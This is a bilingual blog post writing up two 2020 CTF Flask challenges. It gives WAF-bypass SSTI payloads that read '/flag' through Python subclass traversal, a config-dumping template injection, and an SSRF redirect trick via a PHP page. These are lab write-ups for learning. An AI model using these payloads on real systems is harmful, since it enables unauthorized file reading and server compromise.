<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">

















  <meta name="baidu-site-verification" content="wD6I1h8lGi">









<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">

<link rel="stylesheet" href="/css/main.css?v=7.1.2">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">


  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.1.2',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
    back2top: true,
    back2top_sidebar: false,
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="This article is written in Chinese and English, and the content is exactly the same. To view the Chinese version, please scroll down. 本篇文章采用中文和英文两种语言编写，内容完全相同。如需查看中文版请下滑。 2020 GCTF EZFLASKAfter enteri">
<meta property="og:type" content="article">
<meta property="og:title" content="Flask ssti in CTF&#x2F;ctf中的Flask ssti">
<meta property="og:url" content="http://ama666.cn/2020/09/01/Flask-ssti in CTF/index.html">
<meta property="og:site_name" content="ama666">
<meta property="og:description" content="This article is written in Chinese and English, and the content is exactly the same. To view the Chinese version, please scroll down. 本篇文章采用中文和英文两种语言编写，内容完全相同。如需查看中文版请下滑。 2020 GCTF EZFLASKAfter enteri">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2021-10-23T02:46:54.713Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Flask ssti in CTF&#x2F;ctf中的Flask ssti">
<meta name="twitter:description" content="This article is written in Chinese and English, and the content is exactly the same. To view the Chinese version, please scroll down. 本篇文章采用中文和英文两种语言编写，内容完全相同。如需查看中文版请下滑。 2020 GCTF EZFLASKAfter enteri">





  
  
  <link rel="canonical" href="http://ama666.cn/2020/09/01/Flask-ssti in CTF/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Flask ssti in CTF/ctf中的Flask ssti | ama666</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ama666</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <p class="site-subtitle">平时多喝点茶</p>
      
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">

    
    
    
      
    

    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">

    
    
    
      
    

    

    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-sitemap">

    
    
    
      
    

    

    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>

  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://ama666.cn/2020/09/01/Flask-ssti in CTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="安大侠">
      <meta itemprop="description" content="每天挣扎的活着">
      <meta itemprop="image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ama666">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Flask ssti in CTF/ctf中的Flask ssti

              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2020-09-01 15:21:44" itemprop="dateCreated datePublished" datetime="2020-09-01T15:21:44+08:00">2020-09-01</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2021-10-23 10:46:54" itemprop="dateModified" datetime="2021-10-23T10:46:54+08:00">2021-10-23</time>
              
            
          </span>

          

          
            
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="post-meta-item-icon">
            <i class="fa fa-eye"></i>
             阅读次数： 
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
            </span>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>This article is written in Chinese and English, and the content is exactly the same. To view the Chinese version, please scroll down.</p>
<p>本篇文章采用中文和英文两种语言编写，内容完全相同。如需查看中文版请下滑。</p>
<h2 id="2020-GCTF-EZFLASK"><a href="#2020-GCTF-EZFLASK" class="headerlink" title="2020 GCTF EZFLASK"></a>2020 GCTF EZFLASK</h2><p>After entering, the source code of the subject is given</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/ctfhint')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ctf</span><span class="params">()</span>:</span></span><br><span class="line">    hint =xxxx <span class="comment"># hints</span></span><br><span class="line">    trick = xxxx <span class="comment"># trick</span></span><br><span class="line">    <span class="keyword">return</span> trick</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># app.txt</span></span><br><span class="line"><span class="meta">@app.route('/eval', methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_eval</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># post eval</span></span><br><span class="line"><span class="meta">@app.route(xxxxxx, methods=["POST"]) # Secret</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># admin requests</span></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<p>Try to execute the command on the <strong>eval</strong> page and found that there is waf and the filtering is very strict. Not only the single and double quotation marks are filtered, but also <code>[]</code> <code>()</code> <code>{}</code> are filtered out. It seems that it cannot be here What to do with SSTI. The hint and trick in the source code are in the ctf function and can be read by the code object <code>__code__</code>.</p>
<table>
<thead>
<tr>
<th>Properties</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td><code>co_argcount</code></td>
<td>number of arguments (not including keyword only arguments, * or ** args)</td>
</tr>
<tr>
<td><code>co_code</code></td>
<td>string of raw compiled bytecode</td>
</tr>
<tr>
<td><code>co_cellvars</code></td>
<td>tuple of names of cell variables (referenced by containing scopes)</td>
</tr>
<tr>
<td><code>co_consts</code></td>
<td>tuple of constants used in the bytecode</td>
</tr>
<tr>
<td><code>co_filename</code></td>
<td>name of file in which this code object was created</td>
</tr>
<tr>
<td><code>co_firstlineno</code></td>
<td>number of first line in Python source code</td>
</tr>
<tr>
<td><code>co_flags</code></td>
<td>bitmap of CO_* flags, read more here</td>
</tr>
<tr>
<td><code>co_lnotab</code></td>
<td>encoded mapping of line numbers to bytecode indices</td>
</tr>
<tr>
<td><code>co_freevars</code></td>
<td>tuple of names of free variables (referenced via a function’s closure)</td>
</tr>
<tr>
<td><code>co_kwonlyargcount</code></td>
<td>number of keyword only arguments (not including ** arg)</td>
</tr>
<tr>
<td><code>co_name</code></td>
<td>name with which this code object was defined</td>
</tr>
<tr>
<td><code>co_names</code></td>
<td>tuple of names of local variables</td>
</tr>
<tr>
<td><code>co_nlocals</code></td>
<td>number of local variables</td>
</tr>
<tr>
<td><code>co_stacksize</code></td>
<td>virtual machine stack space required</td>
</tr>
<tr>
<td><code>co_varnames</code></td>
<td>tuple of names of arguments and local variables</td>
</tr>
</tbody></table>
<p>Enter <code>ctf.__code__.co_consts</code> in the eval function to read the prompt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(None,&apos;the admin route :h4rdt0f1nd_9792uagcaca00qjaf&lt;!-- port: 5000 --&gt;&apos;,&apos;too young too simple&apos;)</span><br></pre></td></tr></table></figure>

<p>Prompt an <strong>admin</strong> route and 5000 port. To access this route, the prompt given is as follows</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post ip=x.x.x.x&amp;port=xxxx&amp;path=xxx =&gt; http://ip:port/path</span><br></pre></td></tr></table></figure>

<p>It seems that ssrf is going to be performed on the server, so the payload is constructed</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1&amp;port=5000&amp;path=/</span><br></pre></td></tr></table></figure>

<p>However, it was detected as an attack and returned to <code>hacker?</code>, and no access was allowed. Later, I read the write-up of Vidar-Team, because waf_ip is called in the admin function, and there are the following variables,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(None, &apos;0.0&apos;, &apos;192&apos;, &apos;172&apos;, &apos;10.0&apos;, &apos;233.233&apos;, &apos;1234567890.&apos;, 15,&apos;.&apos;, 4)</span><br></pre></td></tr></table></figure>

<p>Or check what libraries are used by the admin function on the eval page, <code>admin.__code__.co_names</code>, this attribute will return all the libraries/functions called in the function and global variables</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;request&apos;,&apos;form&apos;,&apos;waf_ip&apos;,&apos;waf_path&apos;,&apos;len&apos;,&apos;requests&apos;,&apos;get&apos;,&apos;format&apos;,&apos;text&apos;)</span><br></pre></td></tr></table></figure>

<p>Seeing that the requests library is used, it means that you can use redirection to redirect requests locally.</p>
<p>Create a redirect page on your own server and access it under the admin route</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: http://127.0.0.1:5000/"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Got the source code</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">from</span> xxxx <span class="keyword">import</span> flag</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = flag</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">'app.txt'</span>).read()</span><br><span class="line"><span class="meta">@app.route('/&lt;path:hack&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">(hack)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(hack)</span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>Obviously there is SSTI and no filtering, the payload is as follows</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: http://127.0.0.1:5000/&#123;&#123;config.items()&#125;&#125;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="2020-GACTF-simpleflask"><a href="#2020-GACTF-simpleflask" class="headerlink" title="2020 GACTF simpleflask"></a>2020 GACTF simpleflask</h2><p>It is also a gactf question. Without so many twists and turns, it is bypass. Telling you clearly that you have SSTI depends on how you go around. During the test, it was found that no matter how the character encoding was spelled, it was blocked by waf. Later, it turned out to be overwhelmed with <code>+</code>, and it was necessary to fuzz the filtered characters before doing so. The payload is not difficult. Both of the following are fine.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[103].__init__.__globals__[&quot;op&quot;&quot;en&quot;](&quot;/fla&quot;&quot;g&quot;).read()&#125;&#125;</span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[283].getMessage.__globals__[&quot;io&quot;][&quot;open&quot;](&quot;/fla&quot;&quot;g&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>But it won’t list the directories. The python3 used on the server, and many paylaods listed in the directory can’t be used anymore. You can only rely on guessing.</p>
<p>Here is the very complete SSTI payload [<a href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4" target="_blank" rel="noopener">https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4</a> %B8%8ESSTI/](<a href="https://misakikata.github.io/2020/04/python-Sandbox" target="_blank" rel="noopener">https://misakikata.github.io/2020/04/python-Sandbox</a> Escape and SSTI/)</p>
<h2 id="2020-GCTF-EZFLASK-1"><a href="#2020-GCTF-EZFLASK-1" class="headerlink" title="2020 GCTF EZFLASK"></a>2020 GCTF EZFLASK</h2><p>进去之后给出了题目的源代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/ctfhint')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ctf</span><span class="params">()</span>:</span></span><br><span class="line">    hint =xxxx <span class="comment"># hints</span></span><br><span class="line">    trick = xxxx <span class="comment"># trick</span></span><br><span class="line">    <span class="keyword">return</span> trick</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># app.txt</span></span><br><span class="line"><span class="meta">@app.route('/eval', methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_eval</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># post eval</span></span><br><span class="line"><span class="meta">@app.route(xxxxxx, methods=["POST"]) # Secret</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># admin requests</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<p>尝试在<strong>eval</strong>页面执行命令，发现有waf而且过滤的很严格，不仅过滤了单双引号，还将<code>[]</code> <code>()</code> <code>{}</code>全部过滤掉，看起来不能在这用SSTI做什么事情。源代码中的hint和trick都在ctf函数中，可以用代码对象<code>__code__</code>来进行读取。</p>
<table>
<thead>
<tr>
<th>属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>co_argcount</code></td>
<td align="left">number of arguments (not including keyword only arguments, * or ** args)</td>
</tr>
<tr>
<td><code>co_code</code></td>
<td align="left">string of raw compiled bytecode</td>
</tr>
<tr>
<td><code>co_cellvars</code></td>
<td align="left">tuple of names of cell variables (referenced by containing scopes)</td>
</tr>
<tr>
<td><code>co_consts</code></td>
<td align="left">tuple of constants used in the bytecode</td>
</tr>
<tr>
<td><code>co_filename</code></td>
<td align="left">name of file in which this code object was created</td>
</tr>
<tr>
<td><code>co_firstlineno</code></td>
<td align="left">number of first line in Python source code</td>
</tr>
<tr>
<td><code>co_flags</code></td>
<td align="left">bitmap of CO_* flags, read more here</td>
</tr>
<tr>
<td><code>co_lnotab</code></td>
<td align="left">encoded mapping of line numbers to bytecode indices</td>
</tr>
<tr>
<td><code>co_freevars</code></td>
<td align="left">tuple of names of free variables (referenced via a function’s closure)</td>
</tr>
<tr>
<td><code>co_kwonlyargcount</code></td>
<td align="left">number of keyword only arguments (not including ** arg)</td>
</tr>
<tr>
<td><code>co_name</code></td>
<td align="left">name with which this code object was defined</td>
</tr>
<tr>
<td><code>co_names</code></td>
<td align="left">tuple of names of local variables</td>
</tr>
<tr>
<td><code>co_nlocals</code></td>
<td align="left">number of local variables</td>
</tr>
<tr>
<td><code>co_stacksize</code></td>
<td align="left">virtual machine stack space required</td>
</tr>
<tr>
<td><code>co_varnames</code></td>
<td align="left">tuple of names of arguments and local variables</td>
</tr>
</tbody></table>
<p>在eval函数中输入<code>ctf.__code__.co_consts</code>，读取提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(None, &apos;the admin route :h4rdt0f1nd_9792uagcaca00qjaf&lt;!-- port : 5000 --&gt;&apos;, &apos;too young too simple&apos;)</span><br></pre></td></tr></table></figure>

<p>提示了一个<strong>admin</strong>路由和5000端口。访问这个路由，给出的提示如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post ip=x.x.x.x&amp;port=xxxx&amp;path=xxx =&gt; http://ip:port/path</span><br></pre></td></tr></table></figure>

<p>看起来是要对服务器进行ssrf，于是构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1&amp;port=5000&amp;path=/</span><br></pre></td></tr></table></figure>

<p>但是被侦测为攻击，返回<code>hacker?</code>，不允许访问。后来看了<strong>Vidar-Team</strong>的write-up，因为admin函数中又调用了waf_ip，而其中有下面这些变量，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(None, &apos;0.0&apos;, &apos;192&apos;, &apos;172&apos;, &apos;10.0&apos;, &apos;233.233&apos;, &apos;1234567890.&apos;, 15, &apos;.&apos;, 4)</span><br></pre></td></tr></table></figure>

<p>还是在eval页面查看admin函数都用了什么库，<code>admin.__code__.co_names</code>，这个属性会返回函数中所有调用的库/函数以及全局变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;request&apos;, &apos;form&apos;, &apos;waf_ip&apos;, &apos;waf_path&apos;, &apos;len&apos;, &apos;requests&apos;, &apos;get&apos;, &apos;format&apos;, &apos;text&apos;)</span><br></pre></td></tr></table></figure>

<p>看到其中使用了requests库，那就说明可以用重定向在本地重定向请求。</p>
<p>在自己的服务器上创建重定向页面，在admin路由下访问</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: http://127.0.0.1:5000/"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到了源代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">from</span> xxxx <span class="keyword">import</span> flag</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = flag</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">'app.txt'</span>).read()</span><br><span class="line"><span class="meta">@app.route('/&lt;path:hack&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">(hack)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(hack)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>很明显存在SSTI并且没有了过滤，payload如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: http://127.0.0.1:5000/&#123;&#123;config.items()&#125;&#125;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="2020-GACTF-simpleflask-1"><a href="#2020-GACTF-simpleflask-1" class="headerlink" title="2020 GACTF simpleflask"></a>2020 GACTF simpleflask</h2><p>同样也是gactf的题，没有这么多弯弯绕，就是bypass。明摆着告诉你有SSTI，就看你怎么绕。测试的时候发现无论怎么拼字符编码都被waf挡了，后来返现原来是过虑了<code>+</code>，搞之前fuzz一下被过滤字符太有必要了。payload倒是不难，下面两个都可以。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[103].__init__.__globals__[&quot;op&quot;&quot;en&quot;](&quot;/fla&quot;&quot;g&quot;).read()&#125;&#125;</span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[283].getMessage.__globals__[&quot;io&quot;][&quot;open&quot;](&quot;/fla&quot;&quot;g&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>但是不会列目录，服务器上用的python3，很多列目录的paylaod都不能用了，只能靠猜。</p>
<p>码一下很全的SSTI payload <a href="https://misakikata.github.io/2020/04/python-沙箱逃逸与SSTI/" target="_blank" rel="noopener">https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/</a></p>

      
    </div>

    

    
    
    

    

    
      
    
    

    
      <div>
        




  



<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>安大侠</li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    
    <a href="http://ama666.cn/2020/09/01/Flask-ssti in CTF/" title="Flask ssti in CTF/ctf中的Flask ssti">http://ama666.cn/2020/09/01/Flask-ssti in CTF/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
</ul>

      </div>
    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/07/31/Hack-The-Box-Magic/" rel="next" title="Hack The Box-Magic">
                <i class="fa fa-chevron-left"></i> Hack The Box-Magic
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2021/02/08/CSRF attack in JSON scenario/" rel="prev" title="CSRF attack in JSON scenario/JSON情景下的CSRF攻击">
                CSRF attack in JSON scenario/JSON情景下的CSRF攻击 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png" alt="安大侠">
            
